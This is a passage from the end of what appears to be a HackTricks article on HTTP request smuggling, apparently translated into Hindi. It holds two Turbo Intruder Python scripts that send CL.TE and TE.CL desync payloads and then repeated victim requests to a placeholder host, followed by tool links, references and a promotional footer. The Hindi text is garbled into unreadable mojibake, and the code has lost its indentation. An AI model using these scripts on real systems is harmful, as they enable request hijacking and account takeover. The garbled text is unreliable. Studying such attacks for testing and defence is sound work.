engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### рдЯреАрдИ.рд╕реА.рдПрд▓

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## рдЙрдкрдХрд░рдг

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): рдпрд╣ рдЙрдкрдХрд░рдг рд╡рд┐рдЪрд┐рддреНрд░ рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдЕрд╕рдВрдЧрддрд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрдХ рдЧреНрд░рд╛рдорд░-рдЖрдзрд╛рд░рд┐рдд HTTP рдлрдЬрд░ рд╣реИред

## рд╕рдВрджрд░реНрдн

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
